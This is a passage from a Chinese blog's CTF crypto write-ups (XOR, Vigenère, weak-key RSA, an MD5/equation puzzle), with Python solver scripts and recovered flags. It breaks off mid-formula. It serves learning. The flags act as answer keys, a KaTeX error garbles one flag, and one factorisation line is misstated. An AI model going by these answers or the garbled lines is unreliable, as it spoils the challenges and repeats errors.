yxx</h3><p>題目給出明文和密文，用HxD開起來後可以轉為16進位，進行xor後取得真正的明文。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = <span class="number">0x0A031702560115110A140E0A1E300E0A1E300E0A1E30140C190D1F100E060318</span></span><br><span class="line">c = <span class="number">0x6C6F76656C6F76656C6F76656C6F76656C6F76656C6F76656C6F76656C6F7665</span></span><br><span class="line"></span><br><span class="line">m = m^c</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;flag:nctf&#123;xor_xor_xor_biubiubiu&#125;&#x27;</span><br></pre></td></tr></table></figure><h3 id="afctf2018vigenère"><a class="markdownIt-Anchor" href="#afctf2018vigenère"></a> [AFCTF2018]Vigenère</h3><p>密文看起來是詞頻分析，然後根據題目和程式碼判定是Vigenere。</p><p><a href="https://guballa.de/vigenere-solver">解題網站</a></p><table><thead><tr><th style="text-align:center">項目</th><th style="text-align:center">結果</th></tr></thead><tbody><tr><td style="text-align:center">Key</td><td style="text-align:center">“csuwangjiang”</td></tr><tr><td style="text-align:center">Key length</td><td style="text-align:center">12</td></tr><tr><td style="text-align:center">Cipher text length</td><td style="text-align:center">6558</td></tr><tr><td style="text-align:center">Ratio(cipher_len:key_len)</td><td style="text-align:center">546.50</td></tr><tr><td style="text-align:center">Difficulty</td><td style="text-align:center">easy</td></tr><tr><td style="text-align:center">Clear text score (fitness)</td><td style="text-align:center">101.57</td></tr></tbody></table><p>解密出來的密文如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">When in the Course of human events it becomes necessary for one people to dissolve the political bands which have connected them with another and to assume among the powers of the earth, the separate and equal station to which the Laws of Nature and of Nature&#x27;s God entitle them, a decent respect to the opinions of mankind requires that they should declare the causes which impel them to the separation.</span><br><span class="line"></span><br><span class="line">We hold these truths to be self-evident, that all men are created equal, that they are endowed by their Creator with certain unalienable Rights, that among these are Life, Liberty and the pursuit of Happiness. — That to secure these rights, Governments are instituted among Men, deriving their just powers from the consent of the governed, — That whenever any Form of Government becomes destructive of these ends, it is the Right of the People to alter or to abolish it, and to institute new Government, laying its foundation on such principles and organizing its powers in such form, as to them shall seem most likely to effect their Safety and Happiness. Prudence, indeed, will dictate that Governments long established should not be changed for light and transient causes; and accordingly all experience hath shewn that mankind are more disposed to suffer, while evils are sufferable than to right themselves by abolishing the forms to which they are accustomed. But when a long train of abuses and usurpations, pursuing invariably the same Object evinces a design to reduce them under absolute Despotism, it is their right, it is their duty, to throw off such Government, and to provide new Guards for their future security. — Such has been the patient sufferance of these Colonies; and such is now the necessity which constrains them to alter their former Systems of Government. The history of the present King of Great Britain is a history of repeated injuries and usurpations, all having in direct object the establishment of an absolute Tyranny over these States. To prove this, let Facts be submitted to a candid world.</span><br><span class="line"></span><br><span class="line">He has refused his Assent to Laws, the most wholesome and necessary for the public good.</span><br><span class="line"></span><br><span class="line">He has forbidden his Governors to pass Laws of immediate and pressing importance, unless suspended in their operation till his Assent should be obtained; and when so suspended, he has utterly neglected to attend to them.</span><br><span class="line"></span><br><span class="line">He has refused to pass other Laws for the accommodation of large districts of people, unless those people would relinquish the right of Representation in the Legislature, a right inestimable to them and formidable to tyrants only.</span><br><span class="line"></span><br><span class="line">He has called together legislative bodies at places unusual, uncomfortable, and distant from the depository of their Public Records, for the sole purpose of fatiguing them into compliance with his measures.</span><br><span class="line"></span><br><span class="line">He has dissolved Representative Houses repeatedly, for opposing with manly firmness his invasions on the rights of the people.</span><br><span class="line"></span><br><span class="line">He has refused for a long time, after such dissolutions, to cause others to be elected, whereby the Legislative Powers, incapable of Annihilation, have returned to the People at large for their exercise; the State remaining in the mean time exposed to all the dangers of invasion from without, and convulsions within.</span><br><span class="line"></span><br><span class="line">He has endeavoured to prevent the population of these States; for that purpose obstructing the Laws for Naturalization of Foreigners; refusing to pass others to encourage their migrations hither, and raising the conditions of new Appropriations of Lands.</span><br><span class="line"></span><br><span class="line">He has obstructed the Administration of Justice by refusing his Assent to Laws for establishing Judiciary Powers.</span><br><span class="line"></span><br><span class="line">He has made Judges dependent on his Will alone for the tenure of their offices, and the amount and payment of their salaries.</span><br><span class="line"></span><br><span class="line">flag is afctf&#123;Whooooooo_U_Gotcha!&#125;</span><br><span class="line"></span><br><span class="line">He has erected a multitude of New Offices, and sent hither swarms of Officers to harass our people and eat out their substance.</span><br><span class="line"></span><br><span class="line">He has kept among us, in times of peace, Standing Armies without the Consent of our legislatures.</span><br><span class="line"></span><br><span class="line">He has affected to render the Military independent of and superior to the Civil Power.</span><br><span class="line"></span><br><span class="line">He has combined with others to subject us to a jurisdiction foreign to our constitution, and unacknowledged by our laws; giving his Assent to their Acts of pretended Legislation:</span><br><span class="line"></span><br><span class="line">For quartering large bodies of armed troops among us:</span><br><span class="line"></span><br><span class="line">For protecting them, by a mock Trial from punishment for any Murders which they should commit on the Inhabitants of these States:</span><br><span class="line"></span><br><span class="line">For cutting off our Trade with all parts of the world:</span><br><span class="line"></span><br><span class="line">For imposing Taxes on us without our Consent:</span><br><span class="line"></span><br><span class="line">For depriving us in many cases, of the benefit of Trial by Jury:</span><br><span class="line"></span><br><span class="line">For transporting us beyond Seas to be tried for pretended offences:</span><br><span class="line"></span><br><span class="line">For abolishing the free System of English Laws in a neighbouring Province, establishing therein an Arbitrary government, and enlarging its Boundaries so as to render it at once an example and fit instrument for introducing the same absolute rule into these Colonies</span><br><span class="line"></span><br><span class="line">For taking away our Charters, abolishing our most valuable Laws and altering fundamentally the Forms of our Governments:</span><br><span class="line"></span><br><span class="line">For suspending our own Legislatures, and declaring themselves invested with power to legislate for us in all cases whatsoever.</span><br><span class="line"></span><br><span class="line">He has abdicated Government here, by declaring us out of his Protection and waging War against us.</span><br><span class="line"></span><br><span class="line">He has plundered our seas, ravaged our coasts, burnt our towns, and destroyed the lives of our people.</span><br><span class="line"></span><br><span class="line">He is at this time transporting large Armies of foreign Mercenaries to compleat the works of death, desolation, and tyranny, already begun with circumstances of Cruelty &amp; Perfidy scarcely paralleled in the most barbarous ages, and totally unworthy the Head of a civilized nation.</span><br><span class="line"></span><br><span class="line">He has constrained our fellow Citizens taken Captive on the high Seas to bear Arms against their Country, to become the executioners of their friends and Brethren, or to fall themselves by their Hands.</span><br><span class="line"></span><br><span class="line">He has excited domestic insurrections amongst us, and has endeavoured to bring on the inhabitants of our frontiers, the merciless Indian Savages whose known rule of warfare, is an undistinguished destruction of all ages, sexes and conditions.</span><br><span class="line"></span><br><span class="line">In every stage of these Oppressions We have Petitioned for Redress in the most humble terms: Our repeated Petitions have been answered only by repeated injury. A Prince, whose character is thus marked by every act which may define a Tyrant, is unfit to be the ruler of a free people.</span><br><span class="line"></span><br><span class="line">Nor have We been wanting in attentions to our British brethren. We have warned them from time to time of attempts by their legislature to extend an unwarrantable jurisdiction over us. We have reminded them of the circumstances of our emigration and settlement here. We have appealed to their native justice and magnanimity, and we have conjured them by the ties of our common kindred to disavow these usurpations, which would inevitably interrupt our connections and correspondence. They too have been deaf to the voice of justice and of consanguinity. We must, therefore, acquiesce in the necessity, which denounces our Separation, and hold them, as we hold the rest of mankind, Enemies in War, in Peace Friends.</span><br><span class="line"></span><br><span class="line">We, therefore, the Representatives of the united States of America, in General Congress, Assembled, appealing to the Supreme Judge of the world for the rectitude of our intentions, do, in the Name, and by Authority of the good People of these Colonies, solemnly publish and declare, That these united Colonies are, and of Right ought to be Free and Independent States, that they are Absolved from all Allegiance to the British Crown, and that all political connection between them and the State of Great Britain, is and ought to be totally dissolved; and that as Free and Independent States, they have full Power to levy War, conclude Peace, contract Alliances, establish Commerce, and to do all other Acts and Things which Independent States may of right do. — And for the support of this Declaration, with a firm reliance on the protection of Divine Providence, we mutually pledge to each other our Lives, our Fortunes, and our sacred Honor.</span><br></pre></td></tr></table></figure><p>根據眼力可以看到flag is afctf{Whooooooo_U_Gotcha!}解出此題。</p><h3 id="afctf2018你能看出這是什麼加密麼"><a class="markdownIt-Anchor" href="#afctf2018你能看出這是什麼加密麼"></a> [AFCTF2018]你能看出這是什麼加密麼</h3><p>題目給了以下資訊</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 0x928fb6aa9d813b6c3270131818a7c54edb18e3806942b88670106c1821e0326364194a8c49392849432b37632f0abe3f3c52e909b939c91c50e41a7b8cd00c67d6743b4f</span><br><span class="line">q = 0xec301417ccdffa679a8dcc4027dd0d75baf9d441625ed8930472165717f4732884c33f25d4ee6a6c9ae6c44aedad039b0b72cf42cab7f80d32b74061</span><br><span class="line">e = 0x10001</span><br><span class="line">c = 0x70c9133e1647e95c3cb99bd998a9028b5bf492929725a9e8e6d2e277fa0f37205580b196e5f121a2e83bc80a8204c99f5036a07c8cf6f96c420369b4161d2654a7eccbdaf583204b645e137b3bd15c5ce865298416fd5831cba0d947113ed5be5426b708b89451934d11f9aed9085b48b729449e461ff0863552149b965e22b6</span><br></pre></td></tr></table></figure><p>簡單看出是RSA，然後改一下前面的題目將flag取得。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">0x928fb6aa9d813b6c3270131818a7c54edb18e3806942b88670106c1821e0326364194a8c49392849432b37632f0abe3f3c52e909b939c91c50e41a7b8cd00c67d6743b4f</span></span><br><span class="line">q = <span class="number">0xec301417ccdffa679a8dcc4027dd0d75baf9d441625ed8930472165717f4732884c33f25d4ee6a6c9ae6c44aedad039b0b72cf42cab7f80d32b74061</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="number">0x70c9133e1647e95c3cb99bd998a9028b5bf492929725a9e8e6d2e277fa0f37205580b196e5f121a2e83bc80a8204c99f5036a07c8cf6f96c420369b4161d2654a7eccbdaf583204b645e137b3bd15c5ce865298416fd5831cba0d947113ed5be5426b708b89451934d11f9aed9085b48b729449e461ff0863552149b965e22b6</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>輸出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x02\xd3\xe4v\xea\x80r\x83\xda\x99\x88\xf5#\x08\xbbAT\x8b\xaf\xd2\xf4\xdc\x9f\xd3\xbf\xb7A\xc3\xcc\xc5`\xa1\x8b\x86\x18y\xd0&amp;\x88\x10\xef\xbe\x83\xcer\xceC\x17\xec[\xb7%\x08\xef\x16\x1f\xab\x0c\x96\xa3\xdc N^\x8e,\xa3\x11&#123;\x99U\xcd\x15o\xd7B\xf4L\x8f&#125;&amp;\xc5$\xca\xd5;\xf9\x02Y\xc1\xbbS\xfd4\x83M\x96\xa9\xbd;\x83/\xf7\x00afctf&#123;R54_|5_$0_$imp13&#125;&#x27;</span><br></pre></td></tr></table></figure><p>afctf{R54_|5_<span class='katex-error' title='ParseError: KaTeX parse error: Expected group after &#039;_&#039; at position 2: 0_̲'>0_</span>imp13}</p><h3 id="afctf2018可憐的rsa"><a class="markdownIt-Anchor" href="#afctf2018可憐的rsa"></a> [AFCTF2018]可憐的RSA</h3><p>題目給出一組公鑰和加密後的flag，先依據公鑰拆出n和e的值。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;&#x27;&#x27;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIIBJDANBgkqhkiG9w0BAQEFAAOCAREAMIIBDAKCAQMlsYv184kJfRcjeGa7Uc/4</span></span><br><span class="line"><span class="string">3pIkU3SevEA7CZXJfA44bUbBYcrf93xphg2uR5HCFM+Eh6qqnybpIKl3g0kGA4rv</span></span><br><span class="line"><span class="string">tcMIJ9/PP8npdpVE+U4Hzf4IcgOaOmJiEWZ4smH7LWudMlOekqFTs2dWKbqzlC59</span></span><br><span class="line"><span class="string">NeMPfu9avxxQ15fQzIjhvcz9GhLqb373XDcn298ueA80KK6Pek+3qJ8YSjZQMrFT</span></span><br><span class="line"><span class="string">+EJehFdQ6yt6vALcFc4CB1B6qVCGO7hICngCjdYpeZRNbGM/r6ED5Nsozof1oMbt</span></span><br><span class="line"><span class="string">Si8mZEJ/Vlx3gathkUVtlxx/+jlScjdM7AFV5fkRidt0LkwosDoPoRz/sDFz0qTM</span></span><br><span class="line"><span class="string">5q5TAgMBAAE=</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">key = RSA.import_key(c)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e = %d&#x27;</span> % key.e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = %d&#x27;</span> % key.n)</span><br></pre></td></tr></table></figure><p>輸出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e = 65537</span><br><span class="line">n = 79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443</span><br></pre></td></tr></table></figure><p>再透過分解n得到p和q。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 3133337 </span><br><span class="line">q = 25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span><br></pre></td></tr></table></figure><p>接下來就可以透過RSA套件爆開。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443</span></span><br><span class="line">p = <span class="number">3133337</span></span><br><span class="line">q = <span class="number">25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span></span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW/MgPwxVBSl46joFCQ1plcnlDGfL19K/3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/1EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/6/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA==&#x27;</span></span><br><span class="line"></span><br><span class="line">c_bytes = base64.b64decode(c)</span><br><span class="line">rsa_components = (n, e, <span class="built_in">int</span>(d), p, q)</span><br><span class="line">arsa = RSA.construct(rsa_components)</span><br><span class="line">rsakey = RSA.importKey(arsa.exportKey())</span><br><span class="line">rsakey = PKCS1_OAEP.new(rsakey)</span><br><span class="line">decrypted = rsakey.decrypt(c_bytes)</span><br><span class="line"><span class="built_in">print</span>(decrypted)</span><br></pre></td></tr></table></figure><p>輸出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;afctf&#123;R54_|5_$0_B0rin9&#125;&#x27;</span><br></pre></td></tr></table></figure><h3 id="網鼎杯2020-青龍組boom"><a class="markdownIt-Anchor" href="#網鼎杯2020-青龍組boom"></a> [網鼎杯2020 青龍組]boom</h3><p>題目給了一個boom.exe，在終端打開後可以看到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Na Na Na Na</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                @@@@@@@@@           @@@@@@@@@</span><br><span class="line">            @@@@@@@@@@@@@@@@@   @@@@@@@@@@@@@@@@@</span><br><span class="line">           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">                  @@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">                    @@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">                       @@@@@@@@@@@@@@@</span><br><span class="line">                          @@@@@@@@@</span><br><span class="line">                             @@@</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Play a simple game</span><br><span class="line">請按任意鍵繼續 . . .</span><br></pre></td></tr></table></figure><p>繼續後得到下一步的資訊</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">first:this string md5:46e5efe6165a5afb361217446a2dbd01</span><br></pre></td></tr></table></figure><p>都提示是md5了，也沒什麼特別的內容，解出是en5oy之後丟進去得到下一個題目。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">first:this string md5:46e5efe6165a5afb361217446a2dbd01</span><br><span class="line">en5oy</span><br><span class="line">Great next level</span><br><span class="line">請按任意鍵繼續 . . .</span><br></pre></td></tr></table></figure><p>接下來是解聯立方程，輸入x, y, z後進入下一階段。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This time:Here are have some formulas</span><br><span class="line">3x-y+z=185</span><br><span class="line">2x+3y-z=321</span><br><span class="line">x+y+z=173</span><br><span class="line">input: x = 74</span><br><span class="line">input: y = 68</span><br><span class="line">input : z = 31</span><br></pre></td></tr></table></figure><p>此問題可以先用求根找出解，發現<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>7943722218936282</mn><mo>=</mo><mn>89127561</mn><mo>∗</mo><mn>89127561</mn></mrow><annotation encoding="application/x-tex">7943722218936282 = 89127561 * 89127561</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span><span class="mord">9</span><span class="mord">4</span><span class="mord">3</span><span class="mord">7</span><span class="mord">2</span><span class="mord">2</span><span class="mord">2</span><span class="mord">1</span><span class="mord">8</span><span class="mord">9</span><span class="mord">3</span><span class="mord">6</span><span class="mord">2</span><span class="mord">8</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span><span class="mord">9</span><span class="mord">1</span><span class="mord">2</span><span class="mord">7</span><span class="mord">5</span><span class="mord">6</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span><span class="mord">9</span><span class="mord">1</span><span class="mord">2</span><span class="mord">7</span><span class="mord">5</span><span class="mord">6</span><span class="mord">1</span></span></span></span>，結束取得flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Last time: Kill it</span><br><span class="line">x*x+x-7943722218936282=0</span><br><span class="line">input x: 89127561</span><br><span class="line">Great This is your FLAG</span><br><span class="line">flag&#123;en5oy_746831_89127561&#125;</span><br></pre></td></tr></table></figure><p>感覺比較像是misc，不知道為什麼放錯分類了。</p><h3 id="roarctf2019babyrsa"><a class="markdownIt-Anchor" href="#roarctf2019babyrsa"></a> [RoarCTF2019]babyRSA</h3><p>題目如下</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myGetPrime</span>():</span><br><span class="line">    A= getPrime(<span class="number">513</span>)</span><br><span class="line">    <span class="built_in">print</span>(A)</span><br><span class="line">    B=A-random.randint(<span class="number">1e3</span>,<span class="number">1e5</span>)</span><br><span class="line">    <span class="built_in">print</span>(B)</span><br><span class="line">    <span class="keyword">return</span> sympy.nextPrime((B!)%A)</span><br><span class="line">p=myGetPrime()</span><br><span class="line"><span class="comment">#A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span></span><br><span class="line"><span class="comment">#B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span></span><br><span class="line"></span><br><span class="line">q=myGetPrime()</span><br><span class="line"><span class="comment">#A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span></span><br><span class="line"><span class="comment">#B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span></span><br><span class="line"></span><br><span class="line">r=myGetPrime()</span><br><span class="line"></span><br><span class="line">n=p*q*r</span><br><span class="line"><span class="comment">#n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span></span><br><span class="line">c=<span class="built_in">pow</span>(flag,e,n)</span><br><span class="line"><span class="comment">#e=0x1001</span></span><br><span class="line"><span class="comment">#c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span></span><br><span class="line"><span class="comment">#so,what is the flag?</span></span><br></pre></td></tr></table></figure><p>關鍵處應該是</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> sympy.nextPrime((B!)%A)</span><br></pre></td></tr></table></figure><p>可以拆出</p><p class='katex-block katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \n at position 15: p=(B1!) mod A1\̲n̲̲q=(B2!) mod A2'>p=(B1!) mod A1\nq=(B2!) mod A2</p><p>正常來說(B!) mod A基本上是算不出來的，我找了一下發現了威爾遜定理，他的定理如下，想看充分性與必要性證明的自己查Wiki。</p><p>若且唯若p為質數時，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo><mo>≡</mo><mo>−</mo><mn>1</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(p-1)!≡-1(mod p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span></p><p>看起來應該是可以透過A和B的相似性來對公式做變形，但之後就沒有頭緒了，嘗試著找了網路上的解答，但看不太懂，希望以後自己可以解出來。</p><h3 id="nctf2019babyrsa"><a class="markdownIt-Anchor" href="#nctf2019babyrsa"></a> [NCTF2019]babyRSA</h3><p>題目給定如下</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nextPrime</span>(<span class="params">n</span>):</span><br><span class="line">    n += <span class="number">2</span> <span class="keyword">if</span> n &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> isPrime(n):</span><br><span class="line">        n += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = nextPrime(p)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag.encode()), e, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># d = 19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913</span></span><br><span class="line"><span class="comment"># c = 5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804</span></span><br></pre></td></tr></table></figure><p>透過<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>e</mi><mo>∗</mo><mi>d</mi><mo>−</mo><mn>1</mn><mo 